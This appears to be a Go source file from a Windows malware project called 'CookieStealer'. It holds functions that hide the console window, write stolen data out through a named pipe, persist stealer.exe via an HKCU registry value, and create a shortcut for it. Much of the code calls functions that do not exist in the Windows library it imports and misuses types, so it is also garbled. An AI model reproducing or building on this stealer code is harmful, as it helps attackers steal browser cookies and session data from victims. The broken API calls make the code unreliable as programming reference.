//go:build windows
// +build windows

package main

import (
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func hideConsole() {
	hWnd := windows.GetConsoleWindow()
	if hWnd != 0 {
		windows.ShowWindow(hWnd, windows.SW_HIDE)
	}
}

func exfiltrateNamedPipe(name string, data []byte) error {
	filePath := filepath.Join("\\", "\\", name)
	handle, err := windows.CreateFile(&filePath[0], windows.GENERIC_READ|windows.GENERIC_WRITE, 0, nil, windows.OPEN_EXISTING, 0, 0)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(handle)
	var written uint32
	return windows.WriteFile(handle, data, &written, nil)
}

func persistRegistry(config *Config) error {
	var key *windows.Handle
	registryKey := `Software\` + config.Persistence.RegistryKey
	if err := windows.CreateRegKey(windows.HKEY_CURRENT_USER, &registryKey[0], &key); err != nil {
		return err
	}
	defer windows.CloseKey(key)
	value := filepath.Join(os.Getenv("APPDATA"), "CookieStealer", "stealer.exe")
	return windows.SetValueEx(key, "CookieStealer", 0, windows.REG_SZ, &value[0])
}

func createShortcut(linkPath string) error {
	shortcut, err := windows.CoCreateInstance(windows.CLSID_ShellLink)
	if err != nil {
		return err
	}
	persist, err := shortcut.QueryInterface(windows.IID_IPersistFile)
	if err != nil {
		return err
	}
	if err := shortcut.SetPath(filepath.Join(os.Getenv("APPDATA"), "CookieStealer", "stealer.exe")); err != nil {
		return err
	}
	if err := shortcut.SetWorkingDirectory(filepath.Join(os.Getenv("APPDATA"), "CookieStealer")); err != nil {
		return err
	}
	pf := persist.(*windows.IPersistFile)
	return pf.Save(linkPath, true)
}